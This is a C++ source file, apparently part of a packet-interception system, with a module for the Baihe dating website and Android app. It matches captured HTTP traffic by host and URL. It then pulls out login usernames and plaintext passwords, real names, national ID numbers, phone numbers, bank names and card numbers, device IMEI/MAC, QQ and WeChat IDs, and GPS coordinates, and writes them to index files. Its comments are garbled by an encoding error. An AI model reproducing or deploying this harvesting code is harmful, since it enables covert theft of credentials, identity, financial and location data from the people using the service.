#include "StdAfx.h"
#include "MarriageBaiHe.h"

marriage::BaiHeMarriage::BaiHeMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "�ٺ���";	
}

marriage::BaiHeMarriage::~BaiHeMarriage()
{
	
}

int marriage::BaiHeMarriage::IsBaiHeMarriage(HttpSession *http_session)
{
	//��ҳ��¼
	if((http_session->m_Requestline.m_Host.Find("my.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login/gotoLogin")!=-1)) 
	{
		return kPcLogin;
	}
	//��ҳ�޸�����	--���������	
	if((http_session->m_Requestline.m_Host.Find("my.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Userinfo/subBasicInfo")!=-1)) 
	{
		//return kPcWebModiy;
	}
	//��ҳʵ����֤
	if((http_session->m_Requestline.m_Host.Find("app.iddun.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/baihe2015web/3")!=-1)) 
	{
		return kPcRealNameCheck;
	}
	//��׿��¼
	if((http_session->m_Requestline.m_Host.Find("plus.app.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/register/login")!=-1)) 
	{
		return kAndroidLogin;
	}
	//��׿�޸�����
	if((http_session->m_Requestline.m_Host.Find("plus.app.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/user/editUserInfo")!=-1)) 
	{
		return kAndroidModify;
	}
	//��׿ʵ����֤	
	if((http_session->m_Requestline.m_Host.Find("118.145.4.82:3010")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/baihe2015app/3")!=-1)) 
	{
		return kAndroidNameCheck;
	}
	//��׿ѧ����֤
	if((http_session->m_Requestline.m_Host.Find("plus.app.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/credit/orangeAuthGetEdu")!=-1)) 
	{
		return kAndroidEduCheck;
	}
	//��׿������֤
	if((http_session->m_Requestline.m_Host.Find("wallet.jr.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/wallet/api/outer/account/openGetSmsCode")!=-1)) 
	{
		return kAndroidFinCheck;
	}
	//��׿��λ
	if((http_session->m_Requestline.m_Host.Find("plus.app.baihe.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/search/searchNearby")!=-1)) 
	{
		return kAndroidLocation;
	}
	return 0;
}

int marriage::BaiHeMarriage::Process(const char *packet,int action)
{
	//��ҳ��¼
	if (action == kPcLogin)
	{
		return PcWebLogin(packet);
	}
	//��ҳ�޸Ļ�����Ϣ
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	//��ҳʵ����֤
	if (action == kPcRealNameCheck)
	{
		return PcRealNameCheck(packet);
	}
	//��׿��¼
	if (action == kAndroidLogin)
	{
		return AndroidLogin(packet);
	}
	//��׿�޸�����
	if (action == kAndroidModify)
	{
		return AndroidModify(packet);
	}
	//��׿ʵ����֤	
	if (action == kAndroidNameCheck)
	{
		return AndroidNameCheck(packet);
	}
	//��׿ѧ����֤
	if (action == kAndroidEduCheck)
	{
		return AndroidEduCheck(packet);
	}
	//��׿������֤
	if (action == kAndroidFinCheck)
	{
		return AndroidFinCheck(packet);
	}
	//��׿��λ
	if (action == kAndroidLocation)
	{
		return AndroidLocation(packet);
	}
	return 1;
}

//��ҳ��½
int marriage::BaiHeMarriage::PcWebLogin(const char *packet)
{
	//��cookie ����ȡ����
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	ms_->SplitStringToMap(cookie,';','=');
	//�û�ID
	string userId = ms_->GetValueFromMapByKey("userID");
    //���ݲ���
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	//�û���
	string username = ms_->GetValueFromMapByKey("txtLoginEMail",true);
	//����
	string password = ms_->GetValueFromMapByKey("txtLoginPwd");
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"userid=" + userId + "\r\n" + 			//28    [92]    //�û�ID
		"user=" + username + "\r\n" +			//20	[13]	//�û��� 
		"pass=" + password + "\r\n" + 			//21	[14]	//���� 	
		"netmark=" + app_ + "\r\n" + 		    //59	[124]	//��Դ
		"clientmsg=" + platformWeb + "\r\n" +   //62	[126]	//����ƽ̨
		"state=��¼\r\n";						//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��ҳ�޸Ļ�����Ϣ
int marriage::BaiHeMarriage::PcWebModiy(const char *packet)
{
	//��cookie ����ȡ����
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	ms_->SplitStringToMap(cookie,';','=');
	//�û�ID
	string userId = ms_->GetValueFromMapByKey("userID");
	//��uri ����ȡ����
	string uri = http_session_->m_Requestline.m_URI.GetBuffer(0);
	ms_->Replace(uri,"?","&");
	ms_->SplitStringToMap(uri,'&','=');
	//�ǳ�
    string nickName = ms_->GetValueFromMapByKey("nickname",true);
	//��������
	string birthdate = ms_->GetValueFromMapByKey("birthday");
	//�绰����(����)
	string tel = ms_->GetValueFromMapByKey("phoneContact");
	//΢�ź�
	string weiXinContact = ms_->GetValueFromMapByKey("weiXinContact");
	//qq
	string qqContact = ms_->GetValueFromMapByKey("qqContact");

// 	if (qqContact.empty())
// 	{
// 		qqContact = "δ��д";
// 	}
	output_text_ =
		"userid=" + userId + "\r\n" + 			//28    [92]    //�û�ID
		"msg=" +	nickName + "\r\n" + 		//65	[104]   //�ǳ�
		"onick=" +	birthdate + "\r\n" + 		//55	[120]	//��������
		"clientip=" + qqContact + "\r\n" + 		//68	[147] 	//QQ
		"wifissid=" + weiXinContact + "\r\n" + 	//69	[148] 	//΢��
		"netmark=" + app_ + "\r\n" + 		    //59	[124]	//��Դ
		"clientmsg=" + platformWeb + "\r\n" +   //62	[126]	//����ƽ̨
		"state=�޸ĸ�����Ϣ\r\n";			    //64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��ҳʵ����֤
int marriage::BaiHeMarriage::PcRealNameCheck(const char *packet)
{
	//���ݲ���
	string src_data(packet);
	if (src_data.rfind("real_name=") != 0)
	{
		src_data = src_data.substr(src_data.rfind("real_name="));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string real_name = ms_->GetValueFromMapByKey("real_name",true);
	//֤������
	string idType = "���֤";
	//���֤�� 
	string identity_card = ms_->GetValueFromMapByKey("identity_card");
	//�ֻ���
	string user_mob = ms_->GetValueFromMapByKey("user_mob");
    
	output_text_ =
		"mid=" + real_name + "\r\n" + 			//56	[121]	//����	
		"servername=" + idType + "\r\n" + 		//49	[116]   //֤������      
		"appname=" + identity_card + "\r\n" + 	//50	[115]   //֤����
		"oid=" + user_mob + "\r\n" + 			//54	[119]	//�ֻ��� 
		"netmark=" + app_ + "\r\n" + 		    //59	[124]	//��Դ
		"clientmsg=" + platformWeb + "\r\n" +   //62	[126]	//����ƽ̨
		"state=ʵ����֤\r\n";					//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��׿��¼
int marriage::BaiHeMarriage::AndroidLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//�û���
	string username = ms_->GetValueBetweenBeginEnd(src_data,"\"mobile\":\"","\"");
	//����
	string password = ms_->GetValueBetweenBeginEnd(src_data,"\"password\":\"","\"");
    //IMEI
	string imei = ms_->GetValueBetweenBeginEnd(src_data,"\"lastLoginIMEI\":\"","\"");
	//MAC
	string mac = ms_->GetValueBetweenBeginEnd(src_data,"\"lastLoginMAC\":\"","\"");
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 		username + "\r\n" +			//�û��� 
		"pass=" + 		password + "\r\n" + 		//���� 
		"netmark=" +	app_ + "\r\n" + 			//��Դ
		"clientmsg=" +	platformAndroid + "\r\n" +	//����ƽ̨
		"state=��¼\r\n";							//״̬
	WriteIndexFile();
	return 0;
}
//��׿�޸�����
int marriage::BaiHeMarriage::AndroidModify(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	//�û�ID 
	string userID = ms_->GetValueBetweenBeginEnd(src_data,"\"userID\":\"","\"",true);
	//�ǳ�
	string nickname = ms_->GetValueBetweenBeginEnd(src_data,"\"nickname\":\"","\"",true);
	if (userID.empty() || nickname.empty())
	{
		return 0;
	}
	output_text_ =
		"userid=" +     userID + "\r\n" + 			//�û�ID
		"msg=" + 	  	nickname + "\r\n" +			//�ǳ� 
		"netmark=" +	app_ + "\r\n" + 			//��Դ
		"clientmsg=" + platformAndroid + "\r\n" +	//����ƽ̨
		"state=�޸Ļ�����Ϣ\r\n";					//״̬
	WriteIndexFile();
	return 0;
}
//��׿ʵ����֤	
int marriage::BaiHeMarriage::AndroidNameCheck(const char *packet)
{
	//���ݲ���
	string src_data(packet);
	if (src_data.rfind("real_name=") != 0)
	{
		src_data = src_data.substr(src_data.rfind("real_name="));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	string real_name = ms_->GetValueFromMapByKey("real_name",true);
	//֤������
	string idType = "���֤";
	//���֤�� 
	string identity_card = ms_->GetValueFromMapByKey("identity_card");
	//�ֻ���
	string user_mob = ms_->GetValueFromMapByKey("user_mob");
    
	output_text_ =
		"mid=" + real_name + "\r\n" + 				//56	[121]	//����	
		"servername=" + idType + "\r\n" + 			//49	[116]   //֤������      
		"appname=" + identity_card + "\r\n" + 		//50	[115]   //֤����
		"oid=" + user_mob + "\r\n" + 				//54	[119]	//�ֻ��� 
		"netmark=" + app_ + "\r\n" + 				//59	[124]	//��Դ
		"clientmsg=" + platformAndroid + "\r\n" +   //62	[126]	//����ƽ̨
		"state=ʵ����֤\r\n";						//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��׿ѧ����֤
int marriage::BaiHeMarriage::AndroidEduCheck(const char *packet)
{
    //���ݲ���
	string src_data(packet);
	//�û�ID 
	string userID = ms_->GetValueBetweenBeginEnd(src_data,"\"userID\":\"","\",\"name",true);
	//���� 	 
	string name = ms_->GetValueBetweenBeginEnd(src_data,"\"name\":\"","\",\"idno",true);
	//֤������
	string idType = "���֤";
	//���֤�� 
	string idno = ms_->GetValueBetweenBeginEnd(src_data,"idno\":\"","\",\"mobile",true);
	//�ֻ���
	string mobile = ms_->GetValueBetweenBeginEnd(src_data,"mobile\":\"","\",\"smsCode",true);
	output_text_ =
		"userid=" + userID + "\r\n" + 				//28    [92]    //�û�ID
		"mid=" + 	name + "\r\n" + 				//56	[121]	//����
		"servername=" + idType + "\r\n" + 			//49	[116]   //֤������      
		"appname=" + idno + "\r\n" + 				//50	[115]   //֤����
		"oid=" + mobile + "\r\n" + 					//54	[119]	//�ֻ��� 
		"netmark=" +app_ + "\r\n" + 				//59	[124]	//��Դ
		"clientmsg=" +	platformAndroid + "\r\n" +	//62	[126]	//����ƽ̨
		"state=ѧ����֤\r\n";						//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}

//��׿������֤
int marriage::BaiHeMarriage::AndroidFinCheck(const char *packet)
{
	//��cookie ����ȡ����
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	ms_->SplitStringToMap(cookie,';','=');
	//�û�ID
	string userId = ms_->GetValueFromMapByKey("userID");
    //���ݲ���
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	//���� 	 
	string username = ms_->GetValueFromMapByKey("cust_name",true);
	//֤������
	string idType = "���֤";
	//���֤�� 
	string idcard = ms_->GetValueFromMapByKey("id_code",true);
	//�������� 
	string bankname = ms_->GetValueFromMapByKey("bank_name",true);
	//���п��� 
	string bandcard = ms_->GetValueFromMapByKey("acct_id",true);
	//�ֻ���
	string mobile = ms_->GetValueFromMapByKey("mobile_phone");

	output_text_ =
		"userid=" +		userId + "\r\n" + 			//28    [92]    //�û�ID
		"mid=" + 	  	username + "\r\n" + 		//56	[121]	//����
		"servername=" + idType + "\r\n" + 			//49	[116]   //֤������      
		"appname=" + 	idcard + "\r\n" + 			//50	[115]   //֤����
		"fileurl=" + 	bankname + "\r\n" + 		//66	[144]   //��������
		"clientmac=" + 	bandcard + "\r\n" + 		//67	[146] 	//���п���
		"oid=" + 	  	mobile + "\r\n" + 			//54	[119]	//�ֻ��� 
		"netmark=" +	app_ + "\r\n" + 		    //59	[124]	//��Դ
		"clientmsg=" +	platformAndroid + "\r\n" +  //62	[126]	//����ƽ̨
		"state=������֤\r\n";						//64	[19]	//״̬
	WriteIndexFile();
	return 1;
}
int marriage::BaiHeMarriage::AndroidLocation(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	//�û�ID
	string userid = ms_->GetValueBetweenBeginEnd(src_data,"\"userID\":\"","\"");
	//����
	string longtitude = ms_->GetValueBetweenBeginEnd(src_data,"\"longitude\":\"","\"");
	//γ��
	string latitude = ms_->GetValueBetweenBeginEnd(src_data,"\"latitude\":\"","\"");
	if (userid.empty() || longtitude.empty() || latitude.empty())
	{
		return 0;
	}
	output_text_ = 
		"userid=" +		userid + "\r\n" + 			//�û�ID
		"from=" + 	  	longtitude + "\r\n" +		//����  
		"to=" + 	  	latitude + "\r\n" + 		//γ��
		"netmark=" +	app_ + "\r\n" + 			//��Դ
		"clientmsg=" +	platformAndroid + "\r\n" +	//����ƽ̨
		"state=��λ\r\n";	                        //״̬
	WriteIndexFile();								
	return 0;
}